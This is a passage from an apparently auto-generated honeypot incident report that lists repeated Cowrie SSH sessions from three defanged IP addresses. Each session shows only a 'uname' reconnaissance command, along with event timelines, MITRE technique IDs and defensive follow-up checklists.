| `2026-06-25 08:23:14` | `cowrie.login.success` |
| `2026-06-25 08:23:15` | `cowrie.session.params` |
| `2026-06-25 08:23:15` | `cowrie.command.input` |
| `2026-06-25 08:23:15` | `cowrie.log.closed` |
| `2026-06-25 08:23:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c0d47db6e9d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:23 |
| **Last Seen** | 2026-06-25 08:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:23:29` | `cowrie.session.connect` |
| `2026-06-25 08:23:29` | `cowrie.client.version` |
| `2026-06-25 08:23:29` | `cowrie.client.kex` |
| `2026-06-25 08:23:29` | `cowrie.login.success` |
| `2026-06-25 08:23:30` | `cowrie.session.params` |
| `2026-06-25 08:23:30` | `cowrie.command.input` |
| `2026-06-25 08:23:30` | `cowrie.log.closed` |
| `2026-06-25 08:23:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3aa86a9fb1f1

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:23 |
| **Last Seen** | 2026-06-25 08:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:23:40` | `cowrie.session.connect` |
| `2026-06-25 08:23:40` | `cowrie.client.version` |
| `2026-06-25 08:23:40` | `cowrie.client.kex` |
| `2026-06-25 08:23:41` | `cowrie.login.success` |
| `2026-06-25 08:23:42` | `cowrie.session.params` |
| `2026-06-25 08:23:42` | `cowrie.command.input` |
| `2026-06-25 08:23:42` | `cowrie.log.closed` |
| `2026-06-25 08:23:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfca8b622729

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:23 |
| **Last Seen** | 2026-06-25 08:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:23:41` | `cowrie.session.connect` |
| `2026-06-25 08:23:41` | `cowrie.client.version` |
| `2026-06-25 08:23:42` | `cowrie.client.kex` |
| `2026-06-25 08:23:43` | `cowrie.login.success` |
| `2026-06-25 08:23:44` | `cowrie.session.params` |
| `2026-06-25 08:23:44` | `cowrie.command.input` |
| `2026-06-25 08:23:44` | `cowrie.log.closed` |
| `2026-06-25 08:23:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9627ad7206d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:24 |
| **Last Seen** | 2026-06-25 08:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:24:15` | `cowrie.session.connect` |
| `2026-06-25 08:24:15` | `cowrie.client.version` |
| `2026-06-25 08:24:15` | `cowrie.client.kex` |
| `2026-06-25 08:24:15` | `cowrie.login.success` |
| `2026-06-25 08:24:16` | `cowrie.session.params` |
| `2026-06-25 08:24:16` | `cowrie.command.input` |
| `2026-06-25 08:24:16` | `cowrie.log.closed` |
| `2026-06-25 08:24:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aecb6b05aab9

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:24 |
| **Last Seen** | 2026-06-25 08:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:24:54` | `cowrie.session.connect` |
| `2026-06-25 08:24:54` | `cowrie.client.version` |
| `2026-06-25 08:24:54` | `cowrie.client.kex` |
| `2026-06-25 08:24:55` | `cowrie.login.success` |
| `2026-06-25 08:24:56` | `cowrie.session.params` |
| `2026-06-25 08:24:56` | `cowrie.command.input` |
| `2026-06-25 08:24:56` | `cowrie.log.closed` |
| `2026-06-25 08:24:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76671f90565f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:25 |
| **Last Seen** | 2026-06-25 08:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:25:00` | `cowrie.session.connect` |
| `2026-06-25 08:25:00` | `cowrie.client.version` |
| `2026-06-25 08:25:00` | `cowrie.client.kex` |
| `2026-06-25 08:25:01` | `cowrie.login.success` |
| `2026-06-25 08:25:01` | `cowrie.session.params` |
| `2026-06-25 08:25:01` | `cowrie.command.input` |
| `2026-06-25 08:25:01` | `cowrie.log.closed` |
| `2026-06-25 08:25:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02d354083fc8

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:25 |
| **Last Seen** | 2026-06-25 08:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:25:37` | `cowrie.session.connect` |
| `2026-06-25 08:25:37` | `cowrie.client.version` |
| `2026-06-25 08:25:37` | `cowrie.client.kex` |
| `2026-06-25 08:25:38` | `cowrie.login.success` |
| `2026-06-25 08:25:39` | `cowrie.session.params` |
| `2026-06-25 08:25:39` | `cowrie.command.input` |
| `2026-06-25 08:25:39` | `cowrie.log.closed` |
| `2026-06-25 08:25:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1b159884938

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:25 |
| **Last Seen** | 2026-06-25 08:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:25:45` | `cowrie.session.connect` |
| `2026-06-25 08:25:45` | `cowrie.client.version` |
| `2026-06-25 08:25:45` | `cowrie.client.kex` |
| `2026-06-25 08:25:45` | `cowrie.login.success` |
| `2026-06-25 08:25:46` | `cowrie.session.params` |
| `2026-06-25 08:25:46` | `cowrie.command.input` |
| `2026-06-25 08:25:46` | `cowrie.log.closed` |
| `2026-06-25 08:25:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7a6a6e78030

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-06-25 08:25 |
| **Last Seen** | 2026-06-25 08:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:25:50` | `cowrie.session.connect` |
| `2026-06-25 08:25:50` | `cowrie.client.version` |
| `2026-06-25 08:25:51` | `cowrie.client.kex` |
| `2026-06-25 08:25:51` | `cowrie.login.success` |
| `2026-06-25 08:25:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fb945089195

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-06-25 08:25 |
| **Last Seen** | 2026-06-25 08:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:25:51` | `cowrie.session.connect` |
| `2026-06-25 08:25:51` | `cowrie.client.version` |
| `2026-06-25 08:25:51` | `cowrie.client.kex` |
| `2026-06-25 08:25:52` | `cowrie.login.success` |
| `2026-06-25 08:25:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b62ace319ca6

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:26 |
| **Last Seen** | 2026-06-25 08:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:26:16` | `cowrie.session.connect` |
| `2026-06-25 08:26:16` | `cowrie.client.version` |
| `2026-06-25 08:26:16` | `cowrie.client.kex` |
| `2026-06-25 08:26:17` | `cowrie.login.success` |
| `2026-06-25 08:26:18` | `cowrie.session.params` |
| `2026-06-25 08:26:18` | `cowrie.command.input` |
| `2026-06-25 08:26:18` | `cowrie.log.closed` |
| `2026-06-25 08:26:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47ddd9a82fe0

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:26 |
| **Last Seen** | 2026-06-25 08:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:26:28` | `cowrie.session.connect` |
| `2026-06-25 08:26:28` | `cowrie.client.version` |
| `2026-06-25 08:26:28` | `cowrie.client.kex` |
| `2026-06-25 08:26:29` | `cowrie.login.success` |
| `2026-06-25 08:26:30` | `cowrie.session.params` |
| `2026-06-25 08:26:30` | `cowrie.command.input` |
| `2026-06-25 08:26:30` | `cowrie.log.closed` |
| `2026-06-25 08:26:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83cd90abdc70

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:27 |
| **Last Seen** | 2026-06-25 08:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:27:15` | `cowrie.session.connect` |
| `2026-06-25 08:27:15` | `cowrie.client.version` |
| `2026-06-25 08:27:15` | `cowrie.client.kex` |
| `2026-06-25 08:27:15` | `cowrie.login.success` |
| `2026-06-25 08:27:16` | `cowrie.session.params` |
| `2026-06-25 08:27:16` | `cowrie.command.input` |
| `2026-06-25 08:27:16` | `cowrie.log.closed` |
| `2026-06-25 08:27:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b95c50be055

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:27 |
| **Last Seen** | 2026-06-25 08:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:27:44` | `cowrie.session.connect` |
| `2026-06-25 08:27:44` | `cowrie.client.version` |
| `2026-06-25 08:27:44` | `cowrie.client.kex` |
| `2026-06-25 08:27:45` | `cowrie.login.success` |
| `2026-06-25 08:27:46` | `cowrie.session.params` |
| `2026-06-25 08:27:46` | `cowrie.command.input` |
| `2026-06-25 08:27:46` | `cowrie.log.closed` |
| `2026-06-25 08:27:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3501b4f11138

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:27 |
| **Last Seen** | 2026-06-25 08:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:27:59` | `cowrie.session.connect` |
| `2026-06-25 08:27:59` | `cowrie.client.version` |
| `2026-06-25 08:27:59` | `cowrie.client.kex` |
| `2026-06-25 08:28:00` | `cowrie.login.success` |
| `2026-06-25 08:28:01` | `cowrie.session.params` |
| `2026-06-25 08:28:01` | `cowrie.command.input` |
| `2026-06-25 08:28:01` | `cowrie.log.closed` |
| `2026-06-25 08:28:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f58ba31d6e8

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:28 |
| **Last Seen** | 2026-06-25 08:29 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:28:41` | `cowrie.session.connect` |
| `2026-06-25 08:28:41` | `cowrie.client.version` |
| `2026-06-25 08:28:41` | `cowrie.client.kex` |
| `2026-06-25 08:28:42` | `cowrie.login.success` |
| `2026-06-25 08:28:43` | `cowrie.session.params` |
| `2026-06-25 08:28:43` | `cowrie.command.input` |
| `2026-06-25 08:28:43` | `cowrie.log.closed` |
| `2026-06-25 08:29:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d5acf593433

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:28 |
| **Last Seen** | 2026-06-25 08:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:28:45` | `cowrie.session.connect` |
| `2026-06-25 08:28:45` | `cowrie.client.version` |
| `2026-06-25 08:28:45` | `cowrie.client.kex` |
| `2026-06-25 08:28:45` | `cowrie.login.success` |
| `2026-06-25 08:28:46` | `cowrie.session.params` |
| `2026-06-25 08:28:46` | `cowrie.command.input` |
| `2026-06-25 08:28:46` | `cowrie.log.closed` |
| `2026-06-25 08:28:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb791fb727ed

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:28 |
| **Last Seen** | 2026-06-25 08:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:28:45` | `cowrie.session.connect` |
| `2026-06-25 08:28:45` | `cowrie.client.version` |
| `2026-06-25 08:28:45` | `cowrie.client.kex` |
| `2026-06-25 08:28:46` | `cowrie.login.success` |
| `2026-06-25 08:28:47` | `cowrie.session.params` |
| `2026-06-25 08:28:47` | `cowrie.command.input` |
| `2026-06-25 08:28:47` | `cowrie.log.closed` |
| `2026-06-25 08:28:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96c91ca8e449

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:28 |
| **Last Seen** | 2026-06-25 08:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:28:55` | `cowrie.session.connect` |
| `2026-06-25 08:28:55` | `cowrie.client.version` |
| `2026-06-25 08:28:55` | `cowrie.client.kex` |
| `2026-06-25 08:28:56` | `cowrie.login.success` |
| `2026-06-25 08:28:57` | `cowrie.session.params` |
| `2026-06-25 08:28:57` | `cowrie.command.input` |
| `2026-06-25 08:28:57` | `cowrie.log.closed` |
| `2026-06-25 08:28:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-994c0ad2193b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:29 |
| **Last Seen** | 2026-06-25 08:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:29:30` | `cowrie.session.connect` |
| `2026-06-25 08:29:31` | `cowrie.client.version` |
| `2026-06-25 08:29:31` | `cowrie.client.kex` |
| `2026-06-25 08:29:31` | `cowrie.login.success` |
| `2026-06-25 08:29:32` | `cowrie.session.params` |
| `2026-06-25 08:29:32` | `cowrie.command.input` |
| `2026-06-25 08:29:32` | `cowrie.log.closed` |
| `2026-06-25 08:29:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b67191cd084

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:30 |
| **Last Seen** | 2026-06-25 08:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:30:19` | `cowrie.session.connect` |
| `2026-06-25 08:30:19` | `cowrie.client.version` |
| `2026-06-25 08:30:19` | `cowrie.client.kex` |
| `2026-06-25 08:30:20` | `cowrie.login.success` |
| `2026-06-25 08:30:20` | `cowrie.session.params` |
| `2026-06-25 08:30:20` | `cowrie.command.input` |
| `2026-06-25 08:30:21` | `cowrie.log.closed` |
| `2026-06-25 08:30:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd6864e5417b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:31 |
| **Last Seen** | 2026-06-25 08:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:31:07` | `cowrie.session.connect` |
| `2026-06-25 08:31:07` | `cowrie.client.version` |
| `2026-06-25 08:31:07` | `cowrie.client.kex` |
| `2026-06-25 08:31:07` | `cowrie.login.success` |
| `2026-06-25 08:31:08` | `cowrie.session.params` |
| `2026-06-25 08:31:08` | `cowrie.command.input` |
| `2026-06-25 08:31:08` | `cowrie.log.closed` |
| `2026-06-25 08:31:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a1a5aaf852e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:31 |
| **Last Seen** | 2026-06-25 08:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:31:52` | `cowrie.session.connect` |
| `2026-06-25 08:31:52` | `cowrie.client.version` |
| `2026-06-25 08:31:52` | `cowrie.client.kex` |
| `2026-06-25 08:31:52` | `cowrie.login.success` |
| `2026-06-25 08:31:53` | `cowrie.session.params` |
| `2026-06-25 08:31:53` | `cowrie.command.input` |
| `2026-06-25 08:31:53` | `cowrie.log.closed` |
| `2026-06-25 08:31:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e478052d5f4f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:32 |
| **Last Seen** | 2026-06-25 08:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:32:36` | `cowrie.session.connect` |
| `2026-06-25 08:32:36` | `cowrie.client.version` |
| `2026-06-25 08:32:36` | `cowrie.client.kex` |
| `2026-06-25 08:32:37` | `cowrie.login.success` |
| `2026-06-25 08:32:37` | `cowrie.session.params` |
| `2026-06-25 08:32:37` | `cowrie.command.input` |
| `2026-06-25 08:32:38` | `cowrie.log.closed` |
| `2026-06-25 08:32:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-493f5c38456e

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:32 |
| **Last Seen** | 2026-06-25 08:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:32:43` | `cowrie.session.connect` |
| `2026-06-25 08:32:43` | `cowrie.client.version` |
| `2026-06-25 08:32:44` | `cowrie.client.kex` |
| `2026-06-25 08:32:44` | `cowrie.login.success` |
| `2026-06-25 08:32:45` | `cowrie.session.params` |
| `2026-06-25 08:32:45` | `cowrie.command.input` |
| `2026-06-25 08:32:46` | `cowrie.log.closed` |
| `2026-06-25 08:32:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a0f1f3d5b2c

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:33 |
| **Last Seen** | 2026-06-25 08:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:33:21` | `cowrie.session.connect` |
| `2026-06-25 08:33:21` | `cowrie.client.version` |
| `2026-06-25 08:33:21` | `cowrie.client.kex` |
| `2026-06-25 08:33:22` | `cowrie.login.success` |
| `2026-06-25 08:33:22` | `cowrie.session.params` |
